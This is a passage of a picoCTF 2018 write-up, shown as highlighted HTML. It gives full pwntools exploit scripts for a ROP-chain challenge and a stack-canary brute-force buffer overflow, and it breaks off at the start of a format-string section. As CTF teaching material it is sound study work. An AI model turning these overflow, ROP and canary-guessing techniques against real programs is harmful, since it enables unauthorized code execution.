<span style=color:#bd93f9>0x0008</span>:        <span style=color:#bd93f9>0x804840d</span> <span style=color:#ff79c6>&lt;</span>adjust <span style=color:#ff79c6>@</span><span style=color:#bd93f9>0x10</span><span style=color:#ff79c6>&gt;</span> pop ebx; ret
<span style=color:#bd93f9>0x000c</span>:       <span style=color:#bd93f9>0xbaaaaaad</span> arg0
<span style=color:#bd93f9>0x0010</span>:        <span style=color:#bd93f9>0x804862b</span> flag(<span style=color:#bd93f9>0xdeadbaad</span>)
<span style=color:#bd93f9>0x0014</span>:           <span style=color:#f1fa8c>&#39;faaa&#39;</span> <span style=color:#ff79c6>&lt;</span><span style=color:#ff79c6>return</span> address<span style=color:#ff79c6>&gt;</span>
<span style=color:#bd93f9>0x0018</span>:       <span style=color:#bd93f9>0xdeadbaad</span> arg0
</code></pre></td></tr></table>
</div>
</div><p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
<span style=color:#ff79c6>import</span> os

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>

remote_path <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/problems/rop-chain_1_c44c8bc090f78e799c93b77228891dea/&#39;</span>
local_path <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;./&#39;</span>
exe <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;rop&#39;</span>
ssh_user <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;0xade1&#39;</span>
ssh_server <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process</span>(DEV<span style=color:#ff79c6>=</span>DEV):
    <span style=color:#ff79c6>if</span> DEV:
        path <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(local_path, exe)
        s<span style=color:#ff79c6>=</span> process(path)
    <span style=color:#ff79c6>else</span>:
        path <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(remote_path,exe)
        params <span style=color:#ff79c6>=</span> {<span style=color:#f1fa8c>&#34;argv&#34;</span>: path, <span style=color:#f1fa8c>&#34;cwd&#34;</span>: os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>dirname(path)}
        s_ <span style=color:#ff79c6>=</span> ssh(host<span style=color:#ff79c6>=</span>ssh_server, user<span style=color:#ff79c6>=</span>ssh_user)
        s <span style=color:#ff79c6>=</span> s_<span style=color:#ff79c6>.</span>process(<span style=color:#ff79c6>**</span>params)
    <span style=color:#ff79c6>return</span> s

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_offset_manually</span>():
    <span style=color:#6272a4>#python -c &#39;import pwn; print(cyclic(128))&#39; | ./rop</span>
    <span style=color:#6272a4>#dmesg | tail -1</span>
    <span style=color:#6272a4>#[160006.966116] rop[17406]: segfault at 61616168 ip 0000000061616168 [...]</span>
    <span style=color:#6272a4>#eip=&#39;haaa&#39;  (0x61616168)</span>
    <span style=color:#ff79c6>return</span> cyclic_find(<span style=color:#f1fa8c>&#39;haaa&#39;</span>)

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_offset_automatically</span>():
    proc <span style=color:#ff79c6>=</span> get_process(<span style=color:#bd93f9>1</span>)
    proc<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#34;Enter your input&gt; &#34;</span>, cyclic(<span style=color:#bd93f9>200</span>))
    proc<span style=color:#ff79c6>.</span>wait()
    core <span style=color:#ff79c6>=</span> proc<span style=color:#ff79c6>.</span>corefile
    offset <span style=color:#ff79c6>=</span> cyclic_find(core<span style=color:#ff79c6>.</span>eip)
    log<span style=color:#ff79c6>.</span>info(<span style=color:#f1fa8c>&#34;Overflow offset: </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#34;</span><span style=color:#ff79c6>.</span>format(offset))
    <span style=color:#ff79c6>return</span> offset

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>rop_chain</span>():
    elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./rop&#39;</span>)
    rop_chain <span style=color:#ff79c6>=</span> ROP(elf)
    rop_chain<span style=color:#ff79c6>.</span>win_function1()
    rop_chain<span style=color:#ff79c6>.</span>win_function2(<span style=color:#bd93f9>0xBAAAAAAD</span>)
    rop_chain<span style=color:#ff79c6>.</span>flag(<span style=color:#bd93f9>0xDEADBAAD</span>)
    <span style=color:#8be9fd;font-style:italic>print</span> rop_chain<span style=color:#ff79c6>.</span>dump()
    <span style=color:#ff79c6>return</span> rop_chain

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>rop_chain2</span>():
    elf <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./rop&#39;</span>)
    payload <span style=color:#ff79c6>=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win_function1&#39;</span>])
    payload <span style=color:#ff79c6>+=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win_function2&#39;</span>])
    payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0x804840d</span>)   <span style=color:#6272a4>#address of pop ebx; ret</span>
    payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0xBAAAAAAD</span>)
    payload <span style=color:#ff79c6>+=</span> p32(elf<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;flag&#39;</span>])
    payload <span style=color:#ff79c6>+=</span> <span style=color:#f1fa8c>&#39;JUNK&#39;</span>
    payload <span style=color:#ff79c6>+=</span> p32(<span style=color:#bd93f9>0xDEADBAAD</span>)
    <span style=color:#ff79c6>return</span> payload


rop_chain <span style=color:#ff79c6>=</span> rop_chain2()

offset <span style=color:#ff79c6>=</span> get_offset_manually()
payload <span style=color:#ff79c6>=</span> fit({offset: <span style=color:#8be9fd;font-style:italic>str</span>(rop_chain)})

s <span style=color:#ff79c6>=</span> get_process()
s<span style=color:#ff79c6>.</span>sendlineafter(<span style=color:#f1fa8c>&#34;Enter your input&gt; &#34;</span>, payload)

<span style=color:#8be9fd;font-style:italic>print</span> s<span style=color:#ff79c6>.</span>recvall()
</code></pre></td></tr></table>
</div>
</div><h2 id=buffer-overflow-3>buffer-overflow-3</h2>
<ul>
<li>source: <a href=./resources/buffer-overflow-3/vuln.c>vuln.c</a></li>
<li>binary: <a href=./resources/buffer-overflow-3/vuln>vuln</a></li>
</ul>
<p>A custom stack canary of 4 bytes has been added to this binary.
The canary is not randomly generated as it is stored in a canary.txt file.
Therefore, we can easily bruteforce it.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#ff79c6>#define BUFSIZE 32
</span><span style=color:#ff79c6>#define CANARY_SIZE 4
</span><span style=color:#ff79c6></span>
<span style=color:#8be9fd>void</span> <span style=color:#50fa7b>vuln</span>(){
   <span style=color:#8be9fd>char</span> canary[CANARY_SIZE];
   <span style=color:#8be9fd>char</span> buf[BUFSIZE];
   <span style=color:#8be9fd>char</span> length[BUFSIZE];
   <span style=color:#8be9fd>int</span> x <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>;
   [...]
   read(<span style=color:#bd93f9>0</span>,buf,count)	<span style=color:#6272a4>/* Buffer overflow vulnerability HERE */</span>
}
</code></pre></td></tr></table>
</div>
</div><p>The vuln function stack before exploitation should looks like the below:</p>
<pre><code>+---------------+
|  RET TO MAIN	|
+---------------+
|   OLD EBP     |  &lt;-- EBP
+---------------+
|   ????        |
|   ????        |
|   int x = 0	|  &lt;-- EBP - 0xc (obtained with radare2)
+---------------+
|   canary      |  &lt;-- EBP - 0x10
+---------------+
|               |
|   buf[32]     |
|               |  &lt;-- EBP - 0x30
+---------------+
</code></pre>
<p>The vuln function stack during exploitation should looks like the below:</p>
<pre><code>+---------------+
| addr of win()	|
+---------------+
|   'C'*4       |  &lt;-- EBP
+---------------+
|               |
|   'B'*12      |
|               |  &lt;-- EBP - 0xc (obtained with radare2)
+---------------+
|   canary      |  &lt;-- EBP - 0x10
+---------------+
|               |
|   'A'*32      |
|               |  &lt;-- EBP - 0x30
+---------------+
</code></pre>
<p>Full exploit:</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">77
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/env python</span>

<span style=color:#ff79c6>from</span> pwn <span style=color:#ff79c6>import</span> <span style=color:#ff79c6>*</span>
<span style=color:#ff79c6>import</span> os
<span style=color:#ff79c6>from</span> string <span style=color:#ff79c6>import</span> printable

DEV <span style=color:#ff79c6>=</span> <span style=color:#bd93f9>0</span>
h <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;2018shell.picoctf.com&#39;</span>
REMOTE_PATH <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;/problems/buffer-overflow-3_2_810c6904c19a0e8b0da0f59eade5b0ce/&#39;</span>
LOCAL_PATH <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;.&#39;</span>
PRGM <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;vuln&#39;</span>
user, pw <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;0xade1&#39;</span>, <span style=color:#f1fa8c>&#39;YOUR_PASSWORD_HERE&#39;</span>

context<span style=color:#ff79c6>.</span>log_level <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;Critical&#39;</span>


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_process</span>():
    <span style=color:#ff79c6>if</span> DEV:
        p <span style=color:#ff79c6>=</span> process(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(LOCAL_PATH, PRGM))
    <span style=color:#ff79c6>else</span>:
        s <span style=color:#ff79c6>=</span> ssh(host <span style=color:#ff79c6>=</span> h, user<span style=color:#ff79c6>=</span>user) <span style=color:#6272a4>#, password=pw)</span>
        s<span style=color:#ff79c6>.</span>set_working_directory(REMOTE_PATH)
        p <span style=color:#ff79c6>=</span> s<span style=color:#ff79c6>.</span>process(os<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>join(<span style=color:#f1fa8c>&#39;.&#39;</span>,PRGM))
    <span style=color:#ff79c6>return</span> p

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>execute</span>(size, payload):
    p <span style=color:#ff79c6>=</span> get_process()
    prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;&gt;&#39;</span>)
    <span style=color:#6272a4>#print p</span>
    p<span style=color:#ff79c6>.</span>sendline(size)
    p<span style=color:#ff79c6>.</span>recvuntil(<span style=color:#f1fa8c>&#39;Input&gt;&#39;</span>)
    p<span style=color:#ff79c6>.</span>sendline(payload)
    prompt <span style=color:#ff79c6>=</span> p<span style=color:#ff79c6>.</span>recvall()
    p<span style=color:#ff79c6>.</span>close()
    <span style=color:#ff79c6>return</span> prompt


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>brute_Force_next_canary_char</span>(index, canary, initial_payload):
    <span style=color:#ff79c6>try</span>:
        payload <span style=color:#ff79c6>=</span> initial_payload <span style=color:#ff79c6>+</span> canary
        <span style=color:#ff79c6>for</span> char <span style=color:#ff79c6>in</span> printable: <span style=color:#6272a4>#range(256)</span>
            <span style=color:#8be9fd;font-style:italic>print</span> <span style=color:#f1fa8c>&#39;step </span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>/4 - [</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>/255] canary=</span><span style=color:#f1fa8c>{}</span><span style=color:#f1fa8c>&#39;</span><span style=color:#ff79c6>.</span>format(index<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span>, char, canary)
            prompt <span style=color:#ff79c6>=</span> execute(<span style=color:#8be9fd;font-style:italic>str</span>(<span style=color:#8be9fd;font-style:italic>len</span>(payload)<span style=color:#ff79c6>+</span><span style=color:#bd93f9>1</span>), payload <span style=color:#ff79c6>+</span> char)
            <span style=color:#6272a4>#print prompt</span>
            <span style=color:#ff79c6>if</span> <span style=color:#f1fa8c>&#39;***&#39;</span> <span style=color:#ff79c6>in</span> prompt:     <span style=color:#6272a4>#Smashed stack detected</span>
                <span style=color:#ff79c6>continue</span>
            <span style=color:#ff79c6>elif</span> <span style=color:#f1fa8c>&#39;Ok...&#39;</span> <span style=color:#ff79c6>in</span> prompt:
                canary <span style=color:#ff79c6>+=</span> char
                <span style=color:#ff79c6>break</span>
            <span style=color:#ff79c6>else</span>:
                <span style=color:#8be9fd;font-style:italic>print</span> prompt
    <span style=color:#ff79c6>except</span> EOFError:
        <span style=color:#ff79c6>pass</span>
    <span style=color:#ff79c6>return</span> canary


<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>guess_canary</span>(initial_payload, canary):
    <span style=color:#ff79c6>for</span> i <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>range</span>(<span style=color:#bd93f9>4</span><span style=color:#ff79c6>-</span><span style=color:#8be9fd;font-style:italic>len</span>(canary)):
        canary<span style=color:#ff79c6>=</span>brute_Force_next_canary_char(i, canary, initial_payload)
    <span style=color:#ff79c6>return</span> canary

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>get_offset</span>():
    offset <span style=color:#ff79c6>=</span> cyclic_find(<span style=color:#f1fa8c>&#39;eaaa&#39;</span>)
    <span style=color:#ff79c6>return</span> offset

<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>payload</span>():
    initial_payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;A&#39;</span><span style=color:#ff79c6>*</span><span style=color:#bd93f9>32</span>
    canary<span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#39;&#39;</span>
    canary <span style=color:#ff79c6>=</span> guess_canary(initial_payload, canary)
    e <span style=color:#ff79c6>=</span> ELF(<span style=color:#f1fa8c>&#39;./vuln&#39;</span>)
    <span style=color:#6272a4>#win = hex(e.symbols[&#39;win&#39;])</span>
    <span style=color:#6272a4>#ret_addr =  p32(0x080486eb)</span>
    payload <span style=color:#ff79c6>=</span> initial_payload <span style=color:#ff79c6>+</span> canary <span style=color:#ff79c6>+</span> cyclic(get_offset()) <span style=color:#ff79c6>+</span> p32(e<span style=color:#ff79c6>.</span>symbols[<span style=color:#f1fa8c>&#39;win&#39;</span>])
    <span style=color:#8be9fd;font-style:italic>print</span> payload
    <span style=color:#ff79c6>return</span> payload

<span style=color:#8be9fd;font-style:italic>print</span> execute(<span style=color:#8be9fd;font-style:italic>str</span>(<span style=color:#bd93f9>300</span>) , payload())
</code></pre></td></tr></table>
</div>
</div><h2 id=echo-back>echo-back</h2>
<ul>
<li>source: <a href=./resources/echo-back/echoback.c>echoback.c</a></li>
<li>binary: <a href=./resources/echo-back/echoback>echoback</a></li>
</ul>
<p>The program prompt for our input which is printed back to us. However there is an obvious format-string vulnerability.</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
